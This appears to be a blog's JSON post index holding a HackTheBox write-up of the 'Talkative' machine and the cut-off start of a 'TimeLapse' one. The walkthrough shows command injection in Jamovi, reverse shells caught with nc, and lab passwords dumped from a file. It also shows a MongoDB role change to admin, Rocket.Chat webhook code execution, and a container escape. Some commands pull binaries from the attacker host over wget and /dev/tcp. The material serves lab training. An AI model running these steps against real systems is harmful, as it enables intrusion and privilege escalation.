[
  
  {
    "title": "Talkative HTB",
    "url": "/posts/Talkative-HTB/",
    "categories": "HackTheBox, Hard",
    "tags": "",
    "date": "2022-08-27 00:00:00 +0530",
    





    "snippet": "On Talkative, we start with command injection in the Jamovi application, which gives us the shell in a docker container. In-home dir we found the omv file which contains usernames and passwords. We used the creds in bolt CMS to get admin access. Admin can edit the files so we edit the PHP file in config dir and get the shell on the bolt container. We can SSH to the box from the bolt container as a user saul.  Further enumeration shows that the MongoDB container is also present we used it to change the role of a user to gain admin access. Rocket chat admin can create the webhooks, exploiting the webhooks gives the shell to rocket chat container. The third container has cap_dac_read_search capability, which allows us to break out from the container and give us a root shell on the target host.ReconNmap$ nmap -sCV -oN nmap/initial 10.10.11.155PORT     STATE    SERVICE REASON      VERSION22/tcp   filtered ssh     no-response80/tcp   open     http    syn-ack     Apache httpd 2.4.52|_http-title: Did not follow redirect to http://talkative.htb| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.52 (Debian)3000/tcp open     ppp?    syn-ack| fingerprint-strings: |   GetRequest: |     HTTP/1.1 200 OK|     X-XSS-Protection: 1|     X-Instance-ID: 9MNcQmXhcgGteGLSG|     Content-Type: text/html; charset=utf-8|     Vary: Accept-Encoding                                                                                                                                  |     Date: Wed, 24 Aug 2022 09:29:13 GMT|     Connection: close|     &lt;!DOCTYPE html&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;link rel=\"stylesheet\" type=\"text/css\" class=\"__meteor-css__\" href=\"/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true\"&gt;|     &lt;meta charset=\"utf-8\" /&gt;|     &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /&gt;|     &lt;meta http-equiv=\"expires\" content=\"-1\" /&gt;|     &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;|     &lt;meta name=\"fragment\" content=\"!\" /&gt;|     &lt;meta name=\"distribution\" content=\"global\" /&gt;|     &lt;meta name=\"rating\" content=\"general\" /&gt;|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" /&gt;|     &lt;meta name=\"mobile-web-app-capable\" content=\"yes\" /&gt;|     &lt;meta name=\"apple-mobile-web-app-capable\" conten|   HTTPOptions: |     HTTP/1.1 200 OK|     X-XSS-Protection: 1|     X-Instance-ID: 9MNcQmXhcgGteGLSG|     Content-Type: text/html; charset=utf-8|     Vary: Accept-Encoding|     Date: Wed, 24 Aug 2022 09:29:15 GMT|     Connection: close|     &lt;!DOCTYPE html&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;link rel=\"stylesheet\" type=\"text/css\" class=\"__meteor-css__\" href=\"/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true\"&gt;|     &lt;meta charset=\"utf-8\" /&gt;|     &lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /&gt;|     &lt;meta http-equiv=\"expires\" content=\"-1\" /&gt;|     &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;|     &lt;meta name=\"fragment\" content=\"!\" /&gt;|     &lt;meta name=\"distribution\" content=\"global\" /&gt;|     &lt;meta name=\"rating\" content=\"general\" /&gt;|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" /&gt;|     &lt;meta name=\"mobile-web-app-capable\" content=\"yes\" /&gt;|     &lt;meta name=\"apple-mobile-web-app-capable\" conten|   Help, NCP: |_    HTTP/1.1 400 Bad Request8080/tcp open     http    syn-ack     Tornado httpd 5.0|_http-title: jamovi| http-methods: |_  Supported Methods: GET HEAD|_http-server-header: TornadoServer/5.08081/tcp open     http    syn-ack     Tornado httpd 5.0|_http-title: 404: Not Found| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: TornadoServer/5.08082/tcp open     http    syn-ack     Tornado httpd 5.0|_http-server-header: TornadoServer/5.0|_http-title: 404: Not Found| http-methods: |_  Supported Methods: GET HEAD POST OPTIONSThere are several ports are open.  Port 22 SSH is filtered.Other ports are related to the web.Port 80Nmap scan shows that the hostname is talkative.htb. Add this to /etc/hosts file./etc/hosts:$ cat /etc/hosts127.0.0.1       localhost127.0.1.1       kali10.10.11.155    talkative.htb# The following lines are desirable for IPv6 capable hosts::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersAfter checking the site. It shows that the Bolt CMS is used.Gobuster:┌──(kali㉿kali)-[~/htb/talkative]└─$ gobuster dir -u http://talkative.htb/ -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -o port-80.txt/search               (Status: 200) [Size: 15838]/products             (Status: 200) [Size: 18466]/en                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/en/]/files                (Status: 301) [Size: 314] [--&gt; http://talkative.htb/files/]/page                 (Status: 200) [Size: 16163]/people               (Status: 200) [Size: 18386]/product              (Status: 200) [Size: 18466]/pages                (Status: 200) [Size: 16163]/de                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/de/]/fr                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/fr/]/homepage             (Status: 200) [Size: 37217]/assets               (Status: 301) [Size: 315] [--&gt; http://talkative.htb/assets/]/it                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/it/]/nl                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/nl/]/es                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/es/]/pl                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/pl/]/thumbs               (Status: 301) [Size: 315] [--&gt; http://talkative.htb/thumbs/]/ru                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/ru/]/ja                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/ja/]/hu                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/hu/]/theme                (Status: 301) [Size: 314] [--&gt; http://talkative.htb/theme/]/is                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/is/]/person               (Status: 200) [Size: 18386]/nb                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/nb/]/bundles              (Status: 301) [Size: 316] [--&gt; http://talkative.htb/bundles/]/nn                   (Status: 301) [Size: 342] [--&gt; http://talkative.htb/nn/]/bolt                 (Status: 302) [Size: 290] [--&gt; /bolt/login]/bolt endpoint is present. It redirects us to the login page. We don’t have credentials till now.Port 3000On this port rocket chat is installed.Port 8080Here  jamovi is installed.Intial ShellRj editorJamovi application is like a spreadsheet.There is an option Rj editor. The Rj editor allows us to execute the R commands.Code executionSo let’s execute the system commands. To execute the commands we need to press Ctrl +Shift + Enter.system(\"id\",intern=True)We can see the output of id command on the right side of the page, which confirm the code execution.Reverse shellWe can try to execute the reverse shell command.In /root dir there is a file bolt-administration.omv.root@b06821bbda78:~# lslsDocumentsbolt-administration.omvLet’s copy this file to local machine.root@b06821bbda78:~# cat bolt-administration.omv | base64 -w 0cat bolt-administration.omv | base64 -w 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Copy the base64 string and save it in the file.I saved it in the bolt-administration.omv.b64 file.now debase the file using the base64 command and save the output to the file.┌──(kali㉿kali)-[~/htb/talkative]└─$ base64 -d bolt-administration.omv.b64 &gt;&gt; bolt-administration.omvUnzip the file:┌──(kali㉿kali)-[~/htb/talkative/omv]└─$ unzip bolt-administration.omv Archive:  bolt-administration.omv  inflating: META-INF/MANIFEST.MF      inflating: meta                      inflating: index.html                inflating: metadata.json             inflating: xdata.json                inflating: data.bin                  inflating: 01 empty/analysis     xdata.json file contains the username and password.┌──(kali㉿kali)-[~/htb/talkative/omv]└─$ cat xdata.json | jq .{  \"A\": {    \"labels\": [      [        0,        \"Username\",        \"Username\",        false      ],      [        1,        \"matt@talkative.htb\",        \"matt@talkative.htb\",        false      ],      [        2,        \"janit@talkative.htb\",        \"janit@talkative.htb\",        false      ],      [        3,        \"saul@talkative.htb\",        \"saul@talkative.htb\",        false      ]    ]  },  \"B\": {    \"labels\": [      [        0,        \"Password\",        \"Password\",        false      ],      [        1,        \"jeO09ufhWD&lt;s\",        \"jeO09ufhWD&lt;s\",        false      ],      [        2,        \"bZ89h}V&lt;S_DA\",        \"bZ89h}V&lt;S_DA\",        false      ],      [        3,        \")SQWGm&gt;9KHEA\",        \")SQWGm&gt;9KHEA\",        false      ]    ]  },  \"C\": {    \"labels\": []  }}BoltThe cred admin:jeO09ufhWD&lt;s works on bolt login page.Now we are able to access it.At config we can see that we can edit the php files.http://talkative.htb/bolt/filemanager/configEdit the bundle.php file to get the shell.UserThe xdata.json file gives us the list of usernames and passwords.The saul user is present on the box.First, we need to make the shell interactive. Python is not present so I am using script.www-data@b40fc81724eb:/var/www/talkative.htb/bolt/public$ /usr/bin/script -qc /bin/bash /dev/null                                                            &lt;olt/public$ /usr/bin/script -qc /bin/bash /dev/null  The username and password combination of saul:jeO09ufhWD&lt;s  gives us the ssh session.www-data@b40fc81724eb:/var/www/talkative.htb/bolt/public$ ssh saul@10.10.11.155&lt;ww/talkative.htb/bolt/public$ ssh saul@10.10.11.155      The authenticity of host '10.10.11.155 (10.10.11.155)' can't be established.ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesyesCould not create directory '/var/www/.ssh' (Permission denied).Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).saul@10.10.11.155's password: jeO09ufhWD&lt;sWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-81-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat 27 Aug 2022 07:08:38 AM UTC  System load:                      0.0  Usage of /:                       73.2% of 8.80GB  Memory usage:                     62%  Swap usage:                       34%  Processes:                        381  Users logged in:                  0  IPv4 address for br-ea74c394a147: 172.18.0.1  IPv4 address for docker0:         172.17.0.1  IPv4 address for eth0:            10.10.11.155  IPv6 address for eth0:            dead:beef::250:56ff:feb9:cc6f18 updates can be applied immediately.8 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updatesaul@talkative:~$ RootAfter getting the shell as saul, I started to enumerate. I found that there are other containers also. So I uploaded the nmap binary to the server and started to enumerate other services which are present on those containers.saul@talkative:/tmp$ wget http://10.10.14.44:8000/nmapbwget http://10.10.14.44:8000/nmapb--2022-08-29 05:31:41--  http://10.10.14.44:8000/nmapbConnecting to 10.10.14.44:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 5944464 (5.7M) [application/octet-stream]Saving to: ‘nmapb’nmapb               100%[===================&gt;]   5.67M   438KB/s    in 11s     2022-08-29 05:31:53 (511 KB/s) - ‘nmapb’ saved [5944464/5944464]saul@talkative:/tmp$ chmod +x nmapbchmod +x nmapbsaul@talkative:/tmp$ ./nmapb 172.17.0.0/24 ./nmapb 172.17.0.0/24Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-29 05:32 UTCUnable to find nmap-services!  Resorting to /etc/servicesCannot find nmap-payloads. UDP payloads are disabled.Nmap scan report for 172.17.0.1Host is up (0.00012s latency).Not shown: 1171 closed portsPORT     STATE SERVICE22/tcp   open  ssh6000/tcp open  x116001/tcp open  x11-16002/tcp open  x11-26003/tcp open  x11-36004/tcp open  x11-46005/tcp open  x11-56006/tcp open  x11-66007/tcp open  x11-78080/tcp open  http-alt8081/tcp open  tproxyNmap scan report for 172.17.0.2Host is up (0.00036s latency).All 1182 scanned ports on 172.17.0.2 are closedNmap scan report for 172.17.0.3Host is up (0.00035s latency).All 1182 scanned ports on 172.17.0.3 are closedNmap scan report for 172.17.0.4Host is up (0.00011s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.5Host is up (0.00022s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.6Host is up (0.00027s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.7Host is up (0.00028s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.8Host is up (0.00025s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.9Host is up (0.00024s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.10Host is up (0.00024s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.11Host is up (0.00025s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.12Host is up (0.00025s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.13Host is up (0.00027s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.14Host is up (0.00029s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.15Host is up (0.00028s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.16Host is up (0.00024s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.17Host is up (0.00022s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.18Host is up (0.00022s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.17.0.19Host is up (0.00022s latency).Not shown: 1181 closed portsPORT   STATE SERVICE80/tcp open  httpNmap done: 256 IP addresses (19 hosts up) scanned in 24.85 secondsI found that mongodb port is open on container 172.17.0.2.saul@talkative:/tmp$ ./nmapb 172.17.0.2 -p-./nmapb 172.17.0.2 -p-Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-29 05:33 UTCUnable to find nmap-services!  Resorting to /etc/servicesCannot find nmap-payloads. UDP payloads are disabled.Nmap scan report for 172.17.0.2Host is up (0.000052s latency).Not shown: 65534 closed portsPORT      STATE SERVICE27017/tcp open  unknownMongodbTo interact with MongoDB we need to forward the port to our local machine.  I used a chisel to do that.Used below command to interact with mongodb.┌──(kali㉿kali)-[~/htb/talkative]└─$ mongosh Current Mongosh Log ID: 630c51da0badf27eaa3ecaf6Connecting to:          mongodb://127.0.0.1:27017/?directConnection=true&amp;serverSelectionTimeoutMS=2000&amp;appName=mongosh+1.5.4Using MongoDB:          4.0.26Using Mongosh:          1.5.4For mongosh info see: https://docs.mongodb.com/mongodb-shell/------   The server generated these startup warnings when booting   2022-08-28T23:17:41.060+0000:    2022-08-28T23:17:41.060+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine   2022-08-28T23:17:41.060+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem   2022-08-28T23:17:46.726+0000:    2022-08-28T23:17:46.726+0000: ** WARNING: Access control is not enabled for the database.   2022-08-28T23:17:46.726+0000: **          Read and write access to data and configuration is unrestricted.   2022-08-28T23:17:46.726+0000:------------   Enable MongoDB's free cloud-based monitoring service, which will then receive and display   metrics about your deployment (disk utilization, CPU, operation statistics, etc).      The monitoring data will be available on a MongoDB website with a unique URL accessible to you   and anyone you share the URL with. MongoDB may use this information to make product   improvements and to suggest MongoDB products and deployment options to you.      To enable free monitoring, run the following command: db.enableFreeMonitoring()   To permanently disable this reminder, run the following command: db.disableFreeMonitoring()------rs0 [direct: primary] test&gt;show dbsrs0 [direct: primary] test&gt; show dbsadmin   104.00 KiBconfig  124.00 KiBlocal    11.52 MiBmeteor    4.80 MiBmeteor tablers0 [direct: primary] test&gt; use meteorswitched to db meteorrs0 [direct: primary] meteor&gt; show collections_raix_push_app_tokens_raix_push_notificationsinstancesmeteor_accounts_loginServiceConfigurationmeteor_oauth_pendingCredentialsmeteor_oauth_pendingRequestTokensmigrationsrocketchat__trashrocketchat_appsrocketchat_apps_logsrocketchat_apps_persistencerocketchat_avatarsrocketchat_avatars.chunksrocketchat_avatars.filesrocketchat_credential_tokensrocketchat_cron_historyrocketchat_custom_emojirocketchat_custom_soundsrocketchat_custom_user_statusrocketchat_export_operationsrocketchat_federation_dns_cacherocketchat_federation_keysrocketchat_federation_room_eventsrocketchat_federation_serversrocketchat_importrocketchat_integration_historyrocketchat_integrationsrocketchat_invitesrocketchat_livechat_agent_activityrocketchat_livechat_custom_fieldrocketchat_livechat_departmentrocketchat_livechat_department_agentsrocketchat_livechat_external_messagerocketchat_livechat_inquiryrocketchat_livechat_office_hourrocketchat_livechat_page_visitedrocketchat_livechat_triggerrocketchat_livechat_visitorrocketchat_messagerocketchat_message_read_receiptrocketchat_oauth_appsrocketchat_oembed_cacherocketchat_permissionsrocketchat_reportsrocketchat_rolesrocketchat_roomrocketchat_sessionsrocketchat_settingsrocketchat_smarsh_historyrocketchat_statisticsrocketchat_subscriptionrocketchat_uploadsrocketchat_user_data_filesrocketchat_webdav_accountsufsTokensusersusersSessionsview_livechat_queue_status                 [view]system.viewsThe meteor table is used for the rocket chat application. Let’s create a user for rocket chat and make it admin.Update the role of user to adminI updated the role of user terminal to admin.rs0 [direct: primary] meteor&gt; db.users.update({username: \"terminal\"}, { $push: { roles: \"admin\"}})DeprecationWarning: Collection.update() is deprecated. Use updateOne, updateMany, or bulkWrite.{  acknowledged: true,  insertedId: null,  matchedCount: 1,  modifiedCount: 1,  upsertedCount: 0}You can see that user terminal has the role of an admin.rs0 [direct: primary] meteor&gt; db.users.find()[  {    _id: 'rocket.cat',    createdAt: ISODate(\"2021-08-10T19:44:00.224Z\"),    avatarOrigin: 'local',    name: 'Rocket.Cat',    username: 'rocket.cat',    status: 'online',    statusDefault: 'online',    utcOffset: 0,    active: true,    type: 'bot',    _updatedAt: ISODate(\"2021-08-10T19:44:00.615Z\"),    roles: [ 'bot' ]  },  {    _id: 'ZLMid6a4h5YEosPQi',    createdAt: ISODate(\"2021-08-10T19:49:48.673Z\"),    services: {      password: {        bcrypt: '$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y'      },      email: {        verificationTokens: [          {            token: 'dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w',            address: 'saul@talkative.htb',            when: ISODate(\"2021-08-10T19:49:48.738Z\")          }        ]      },      resume: { loginTokens: [] }    },    emails: [ { address: 'saul@talkative.htb', verified: false } ],    type: 'user',    status: 'offline',    active: true,    _updatedAt: ISODate(\"2022-08-28T23:28:24.451Z\"),    roles: [ 'admin' ],    name: 'Saul Goodman',    lastLogin: ISODate(\"2022-03-15T17:06:56.543Z\"),    statusConnection: 'offline',    username: 'admin',    utcOffset: 0  },  {    _id: 'PFk2cf2K9KXxfxDZJ',    createdAt: ISODate(\"2022-08-29T05:45:08.454Z\"),    services: {      password: {        bcrypt: '$2b$10$X6PICjEg24CdvsG/rPyi0.Cyg1Txy5KLzVll1pESzc8vNPJDn1.5S',        reset: {          token: 'n_eMLcaoIHUYGEGYbtCkhA-HOqp3gZQNkRFtqulOMfr',          email: 'terminal@talkative.htb',          when: ISODate(\"2022-08-29T05:45:12.363Z\"),          reason: 'enroll'        }      },      email: {        verificationTokens: [          {            token: 'XbbQhr_NlPhLJOJ9YiVsJmCK2ykgM-UEyjpzyMZMcz1',            address: 'terminal@talkative.htb',            when: ISODate(\"2022-08-29T05:45:08.487Z\")          }        ]      },      resume: {        loginTokens: [          {            when: ISODate(\"2022-08-29T05:45:08.844Z\"),            hashedToken: 'PhIYkG4MigT9xdhYUclTUrcz/BqkDyqAUSD2gJ9AmYY='          }        ]      }    },    emails: [ { address: 'terminal@talkative.htb', verified: false } ],    type: 'user',    status: 'online',    active: true,    _updatedAt: ISODate(\"2022-08-29T05:45:12.389Z\"),    roles: [ 'user', 'admin' ],    name: 'terminal',    lastLogin: ISODate(\"2022-08-29T05:45:08.842Z\"),    statusConnection: 'online',    utcOffset: -4,    username: 'terminal'  }]Rocket chat RCEIn rocket chat server we can add integrations. With the help of it we can add net webhook.in webhook there is an option to add script. By uploading the script we can get code execution.Create a new Incoming WebHook IntegrationNow refresh the page. There is an Webhook url is presnet access it and get the shell.┌──(kali㉿kali)-[~/htb/talkative]└─$ curl http://talkative.htb:3000/hooks/roJG6PNf9YKK8QKc8/6fp7pkohFi6J9feRFvY59FGJqfjnaXjnCi7W5RcRaASn8ruP{\"success\":false}┌──(kali㉿kali)-[~/htb/talkative]└─$ nc -nvlp 9002listening on [any] 9002 ...connect to [10.10.14.44] from (UNKNOWN) [10.10.11.155] 41028bash: cannot set terminal process group (1): Inappropriate ioctl for devicebash: no job control in this shellroot@c150397ccd63:/app/bundle/programs/server# Root flagThere is nothing here on this docker container. So I decided to check capabilities.root@c150397ccd63:/app/bundle/programs/server# cat /proc/self/statuscat /proc/self/statusName:   catUmask:  0022State:  R (running)Tgid:   24Ngid:   0Pid:    24PPid:   22TracerPid:      0Uid:    0       0       0       0Gid:    0       0       0       0FDSize: 256Groups:  NStgid: 24NSpid:  24NSpgid: 1NSsid:  1VmPeak:     2432 kBVmSize:     2432 kBVmLck:         0 kBVmPin:         0 kBVmHWM:       736 kBVmRSS:       736 kBRssAnon:              64 kBRssFile:             672 kBRssShmem:              0 kBVmData:      312 kBVmStk:       132 kBVmExe:        28 kBVmLib:      1428 kBVmPTE:        40 kBVmSwap:        0 kBHugetlbPages:          0 kBCoreDumping:    0THP_enabled:    1Threads:        1SigQ:   0/7484SigPnd: 0000000000000000ShdPnd: 0000000000000000SigBlk: 0000000000000000SigIgn: 0000000000000000SigCgt: 0000000000000000CapInh: 0000000000000000CapPrm: 00000000a80425fdCapEff: 00000000a80425fdCapBnd: 00000000a80425fdCapAmb: 0000000000000000NoNewPrivs:     0Seccomp:        2Speculation_Store_Bypass:       thread force mitigatedCpus_allowed:   00000000,00000000,00000000,00000003Cpus_allowed_list:      0-1Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,000000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00Mems_allowed_list:      0voluntary_ctxt_switches:        2nonvoluntary_ctxt_switches:     0┌──(kali㉿kali)-[~/htb/talkative]└─$ capsh --decode=00000000a80425fd0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcapHere we can see the capability cap_dac_read_search which allows us to read the files from the host machine.Here I used cdk binary to get the root flag.Transfer the file to the docker container.┌──(kali㉿kali)-[~/htb/talkative/shocker]└─$ nc -nvlp 9003 &lt; cdk                                                                                                                                      listening on [any] 9003 ...connect to [10.10.14.44] from (UNKNOWN) [10.10.11.155] 58398root@c150397ccd63:~# cat &lt; /dev/tcp/10.10.14.44/9003  &gt; cdkRun the binary.root@c150397ccd63:~# chmod +x cdkroot@c150397ccd63:~# ./cdk run cap-dac-read-search /root/root.txtRunning with target: /root/root.txt, ref: /etc/hostname3ed04d813515d4bd6df074f70521b236"
  },
  
  {
    "title": "TimeLapse HackTheBox",
    "url": "/posts/TimeLapse-HackTheBox/",
    "categories": "HackTheBox, Easy",
    "tags": "",
    "date": "2022-08-20 00:00:00 +0530",
    





    "snippet": "Timelapse is an Easy Windows that starts with accessing the SMB share. In SMB shares there is a zip file. We crack the zip file using John. The ZIP files contain the encrypted PFX file.Again using John we crack the password. From the PFX file, we extract the SSL certificate and a private key, which are used to log in with Winrm. As we log in to the box we found the PowerShell history file contains the password for the user svc_deploy. The user is part of LAPS_Readers. Using it we get the Administrator password.Nmap Scan$ nmap -sCV -oN nmap/initial  10.10.11.152  -Pn# Nmap 7.92 scan initiated Sun Aug 14 01:05:52 2022 as: nmap -sCV -oN nmap/initial -vv -Pn 10.10.11.152Nmap scan report for 10.10.11.152Host is up, received user-set (0.24s latency).Scanned at 2022-08-14 01:05:53 EDT for 89sNot shown: 989 filtered tcp ports (no-response)PORT     STATE SERVICE       REASON  VERSION53/tcp   open  domain        syn-ack Simple DNS Plus88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-08-14 